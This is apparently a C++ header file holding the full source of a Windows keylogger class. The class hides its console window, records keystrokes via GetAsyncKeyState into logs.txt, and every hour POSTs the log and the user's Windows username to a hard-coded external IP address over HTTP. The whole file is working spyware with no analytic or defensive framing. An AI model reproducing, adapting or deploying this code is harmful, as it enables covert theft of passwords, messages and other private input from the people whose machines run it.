#pragma once
#include "Header.h"
#include "Key.h"

class Keylogger : protected Key
{
public:  
    void initcpName()
    {
        if (!success)
        {
            DWORD errorCode = GetLastError();
            printf("Error getting username: %d\n", errorCode);
        }
    }
        
    void init()
    {
        while (true)
        {
            auto now = system_clock::now();
            initializingKeys();
            HideConsole();
            Sleep(100);
            if (duration_cast<hours>(now - last_hour).count() >= 1)
            {
                this->last_hour = now;
                if (!SendPostRequest(url, filename, userName))
                {
                    return;
                }               
                file.close();
            }
            if (!file.is_open())
            {
                openFile();
            }
        }
    }
private:
    void initializingKeys()
    {
        char keys[] = "QWERTYUIOPASDFGHJKLZXCVBNM1234567890";
        for (char key : keys)
        {
            if (GetAsyncKeyState(key) & 0x8000)
            {
                file << key;
                file.flush();
            }
        }

        if (GetAsyncKeyState(VK_RETURN) & 0x8000)
        {
            file << "\n";
            file.flush();
        }

        if (GetAsyncKeyState(VK_SPACE) & 0x8000)
        {
            file << " ";
            file.flush();
        }
    }

    static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp)
    {
        ((std::string*)userp)->append((char*)contents, size * nmemb);
        return size * nmemb;
    }

    bool SendPostRequest(const std::string& url, const std::string& filename, const char* pcName)
    {
        CURL* curl = curl_easy_init();
        if (curl == nullptr)
        {
            std::cerr << "curl_easy_init() failed" << std::endl;
            return false;
        }

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POST, 1);

        struct curl_httppost* post = nullptr;
        struct curl_httppost* last = nullptr;
        curl_formadd(&post, &last, CURLFORM_COPYNAME, "pc", CURLFORM_COPYCONTENTS, pcName, CURLFORM_END);
        curl_formadd(&post, &last, CURLFORM_COPYNAME, "file", CURLFORM_FILE, filename.c_str(), CURLFORM_END);

        curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);

        std::string response;
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        CURLcode res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);

        if (res != CURLE_OK)
        {
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
            return false;
        }

        std::cout << "Response: " << response << std::endl;

        return true;
    }

    void openFile()
    {
        file.open("logs.txt", std::ios::out | std::ios::trunc);
    }

    void HideConsole()
    {
        ShowWindow(GetConsoleWindow(), SW_HIDE);
    }

    std::ofstream file;
    std::string url = "http://95.56.143.63:8000/v1/file";
    std::string filename = "logs.txt";
    char userName[UNLEN + 1];
    DWORD userNameLength = UNLEN + 1;
    BOOL success = GetUserNameA(userName, &userNameLength);  
    system_clock::time_point last_hour = system_clock::now();
};